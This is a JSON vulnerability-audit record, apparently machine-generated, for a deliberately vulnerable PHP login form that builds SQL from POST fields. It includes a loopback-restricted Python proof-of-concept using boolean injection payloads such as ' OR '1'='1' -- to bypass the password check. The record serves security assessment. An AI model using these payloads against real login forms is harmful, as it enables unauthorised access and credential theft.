@@ -1,0 +1,122 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-002",
+  "input_version": "v2",
+  "prompt_version": "v1",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-002"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "已提供的代码块内证据链完整：第8-9行直接读取 POST 的 uname/passwd，第16行在双引号字符串中把二者拼进单引号闭合的 SQL，第17行 mysql_query 执行，全程未见转义、预处理、类型约束或白名单（第4行 error_reporting(0) 只影响错误显示，不构成防护）。缺口是 include 的连接文件与运行环境未提供，故按待验证记录，不升级为确认。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-002-F1",
+      "vulnerability_type": "SQL注入（登录表单 username 与 password 字符串拼接）",
+      "locations": [
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 16,
+          "line_end": 17,
+          "quote": "@$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 8,
+          "line_end": 9,
+          "quote": "$uname=$_POST['uname'];"
+        },
+        {
+          "fragment_id": "SQLI-002",
+          "line_start": 38,
+          "line_end": 38,
+          "quote": "print_r(mysql_error());"
+        }
+      ],
+      "data_flow": [
+        "入口：第6行 if(isset($_POST['uname']) && isset($_POST['passwd'])) 接收顶层 POST 参数 uname 与 passwd。",
+        "第8-9行把 $_POST['uname']、$_POST['passwd'] 原样赋给局部变量，未做类型、长度、格式或白名单校验，也未调用转义函数。",
+        "第11-14行把两个原始值写入 result.txt（明文凭据落盘，见 risk_notes）。",
+        "第16行在双引号字符串中把变量直接插入单引号闭合的 SQL 字面量，输入中的单引号会改变语句结构；用户名与口令都被拼接。",
+        "第17行 mysql_query($sql) 执行拼接后的语句，前置 @ 仅抑制本行错误；第18行 mysql_fetch_array 取第一行。",
+        "观察点：第19-33行命中时输出 users 表首行的 username/password 并显示 flag.jpg；第36-43行未命中时显示 mysql_error() 与 slap.jpg。"
+      ],
+      "principle": "用户输入未经任何转义或参数化即被拼接到 SQL 字符串：username='$uname' and password='$passwd'。输入的单个引号可提前闭合字面量，随后用 OR 逻辑或注释（-- 加空格）改写 WHERE 条件，使查询返回与口令无关的行；由于结果被直接取用并回显，构成登录绕过与数据读取路径。",
+      "impact": "未认证远程请求可绕过口令校验，以 users 表首行身份进入（示例代码中直接显示该行 username 与 password），并可借助 mysql_error 回显或布尔差异继续推断数据库内容。示例还记录原始凭据到 result.txt，扩大泄露面。",
+      "preconditions": [
+        "该文件被 Web 服务器路由为可通过 POST 访问的入口，且 PHP 能加载 mysql_* 扩展（PHP 5.x 或提供兼容层），如已知限制所述需兼容运行环境。",
+        "include('../sql-connections/sql-connect.php') 存在并成功建立到含 users 表的数据库连接。",
+        "请求方无需预先认证即可到达第6行的参数分支。",
+        "users 表至少存在一行数据（布尔真分支需要可返回的行）。",
+        "从入口到第16行之间没有框架级 WAF、全局 addslashes/magic_quotes 或其他改写参数的外部过滤。"
+      ],
+      "counterexamples": [
+        "若全局对 $_POST 做了 addslashes/magic_quotes 或等价转义（本代码块内未见），单引号注入被中和。",
+        "若连接文件或更外层入口在处理前覆盖、过滤或拒绝含引号/注释符的参数，该路径不可用（需另行查看，未提供）。",
+        "若部署环境改用预处理语句或把该文件替换为参数化实现，则第16-17行的拼接不成立。",
+        "若服务器未路由到该文件、或前端强制登录后才允许提交，则未认证路径被阻断。",
+        "error_reporting(0) 与 @ 会隐藏 PHP 层告警，mysql_error 也可能为空，因此仅凭错误文本不构成注入证据。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n\"\"\"Loopback-only SQL injection verification draft for SQLI-002.\n\nOnly loopback targets are accepted. Redirects are not followed and response\nbodies are never printed, so a successful bypass cannot leak credentials into\nconsole logs. Standard library only.\n\"\"\"\nimport argparse\nimport json\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        # Returning None makes urllib raise HTTPError instead of following.\n        return None\n\n\ndef check_target(url):\n    parsed = urllib.parse.urlsplit(url)\n    if parsed.scheme not in (\"http\", \"https\"):\n        raise SystemExit(\"only http/https targets are allowed\")\n    host = (parsed.hostname or \"\").lower()\n    if host not in ALLOWED_HOSTS:\n        raise SystemExit(\"host %r is not loopback; refusing to run\" % host)\n    return parsed\n\n\ndef post_form(opener, url, fields, timeout):\n    data = urllib.parse.urlencode(fields).encode(\"utf-8\")\n    req = urllib.request.Request(url, data=data, method=\"POST\")\n    req.add_header(\"Content-Type\", \"application/x-www-form-urlencoded\")\n    req.add_header(\"User-Agent\", \"sqli-002-local-verify/1.0\")\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            return resp.status, resp.read(200000).decode(\"utf-8\", \"replace\"), None\n    except urllib.error.HTTPError as exc:\n        return exc.code, exc.read(200000).decode(\"utf-8\", \"replace\"), \"http_error_or_redirect\"\n    except urllib.error.URLError as exc:\n        return None, \"\", \"connection:%s\" % exc.reason\n    except TimeoutError:\n        return None, \"\", \"timeout\"\n\n\ndef summarize(status, body, error):\n    if error:\n        return {\"http_status\": status, \"error\": error}\n    return {\n        \"http_status\": status,\n        \"has_success_marker\": \"flag.jpg\" in body,\n        \"has_failure_marker\": \"slap.jpg\" in body,\n        \"body_length\": len(body),\n    }\n\n\ndef main():\n    ap = argparse.ArgumentParser(\n        description=\"Loopback-only SQLi draft for SQLI-002; changes only the uname value.\")\n    ap.add_argument(\"--url\", required=True,\n                    help=\"handler URL, e.g. http://127.0.0.1:8080/sqli-002.php\")\n    ap.add_argument(\"--timeout\", type=float, default=8.0)\n    ap.add_argument(\"--out\", default=None, help=\"optional JSON result file\")\n    args = ap.parse_args()\n\n    check_target(args.url)\n    opener = urllib.request.build_opener(NoRedirect())\n\n    # Baseline: a username that does not exist, valid SQL.\n    baseline = post_form(opener, args.url,\n                         {\"uname\": \"probe_user_zz\", \"passwd\": \"probe_pass_zz\"}, args.timeout)\n    # Same request except the injection clause; \" -- \" comments out the password check.\n    true_case = post_form(opener, args.url,\n                          {\"uname\": \"probe_user_zz' OR '1'='1' -- \", \"passwd\": \"probe_pass_zz\"},\n                          args.timeout)\n    false_case = post_form(opener, args.url,\n                           {\"uname\": \"probe_user_zz' OR '1'='2' -- \", \"passwd\": \"probe_pass_zz\"},\n                           args.timeout)\n\n    report = {\n        \"baseline\": summarize(*baseline),\n        \"payload_true\": summarize(*true_case),\n        \"payload_false\": summarize(*false_case),\n    }\n    print(json.dumps(report, ensure_ascii=False, indent=2))\n    if args.out:\n        with open(args.out, \"w\", encoding=\"utf-8\") as fh:\n            json.dump(report, fh, ensure_ascii=False, indent=2)\n\n    ok = (report[\"baseline\"].get(\"has_success_marker\") is False\n          and report[\"payload_true\"].get(\"has_success_marker\") is True\n          and report[\"payload_false\"].get(\"has_success_marker\") is False)\n    return 0 if ok else 1\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+（仅标准库：argparse、json、urllib）"
+        ],
+        "parameters": [
+          "--url：指向 SQLI-002 处理脚本的本地 URL，例如 http://127.0.0.1:8080/sqli-002.php；仅接受 localhost、127.0.0.1、::1。",
+          "--timeout：请求超时秒数，默认 8。",
+          "--out：可选，保存本次 JSON 观测结果的文件路径。"
+        ],
+        "steps": [
+          "在本地授权靶场部署标准化样本及 context/sqli-connect.php 所依赖的连接配置，确认 users 表可查询。",
+          "运行 python sqli-002-poc.py --url http://127.0.0.1:8080/sqli-002.php --out result.json。",
+          "脚本先发送基线请求（uname=probe_user_zz），再仅改变 uname 发送 OR '1'='1' 与 OR '1'='2' 两个载荷，passwd 保持不变。",
+          "比较三次响应中 flag.jpg（命中分支）与 slap.jpg（未命中分支）标记及 HTTP 状态。",
+          "如需人工复核，仅记录布尔标记与状态码，不打印、不保存响应正文中的凭据；测试后在靶场重置 users 表与 result.txt。"
+        ],
+        "expected_observation": "基线响应含 slap.jpg 且无 flag.jpg；OR '1'='1' 载荷的响应含 flag.jpg（命中分支，说明 WHERE 条件被改写）；OR '1'='2' 载荷的响应回到 slap.jpg。三个请求仅 uname 值不同。",
+        "success_criteria": "在相同 URL、会话与 passwd 下，基线=失败标记、真条件载荷=成功标记、假条件载荷=失败标记，且重复一次结果稳定；该差异对应第16-17行拼接路径。仅 HTTP 200 或出现输入回显不算成功。",
+        "limitations": [
+          "未运行：本次没有可用的 PHP/MySQL 运行环境，execution_status 为未运行，不能声称已观察到注入效果。",
+          "脚本需人工适配实际部署路径、端口与是否能直连该文件；标记字符串依赖样本第32、42行的图片文件名，若模板被改动需同步调整。",
+          "布尔差分只能说明条件被改写；若目标对错误/失败页做统一化处理，可能观察不到差异。",
+          "POC 不枚举、不导出 users 数据，也不使用时间盲注或报错注入提取内容。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "context/sqli-connect.php（或 sql-connections/sql-connect.php）的连接实现与凭据配置未提供，无法确认连接是否成功及是否存在全局过滤。",
+    "PHP 版本、mysql_* 扩展或兼容层、MySQL 版本与 sql_mode 未提供，影响引号/注释语法与错误回显行为。",
+    "Web 服务器路由、是否要求登录、是否有 WAF 或全局 magic_quotes/addslashes 配置未知。",
+    "users 表结构与数据行未知，布尔真分支能否返回行无法静态确认。",
+    "result.txt 的运行期可写性与目录位置未知。"
+  ],
+  "risk_notes": [
+    "第11-14行把原始 uname 与 passwd 以明文写入 result.txt，属于凭据落盘风险，与本条 SQL 注入分开记录。",
+    "第25、27行在成功分支回显 users 表的 username 与 password，扩大信息泄露面。",
+    "第38行 print_r(mysql_error()) 向客户端输出数据库错误，可能辅助报错注入并泄露结构信息；error_reporting(0) 只压制 PHP 层错误。"
+  ],
+  "quality_notes": [
+    "mysql_query、mysql_fetch_array、mysql_error 属于已废弃接口，在 PHP 7+ 被移除，需要兼容运行环境。",
+    "第17行使用 @ 抑制错误，掩盖执行失败，不利于排障。",
+    "第11行 fopen 未检查返回值，写日志失败时后续 fwrite 会产生告警（被 error_reporting(0) 隐藏）。",
+    "缺少输入校验与统一的输出编码，且顶层脚本把请求处理、日志、查询与展示混在一起。"
+  ],
+  "limitations": [
+    "结论仅基于本次提供的单个代码块（normalized_samples/SQLI-002.php 的 1 起始行号），未查看连接文件、配置、路由或其他仓库材料。",
+    "未执行任何请求，POC 为需人工适配的草案；verdict 保持待验证，未升级为确认。",
+    "无法排除部署层存在统一过滤或参数化封装；若存在，需以实际配置复核后再判定。",
+    "不宣称整个项目安全；排除结论仅适用于已覆盖路径，本样本未作排除。"
+  ],
+  "runtime_evidence": []
+}
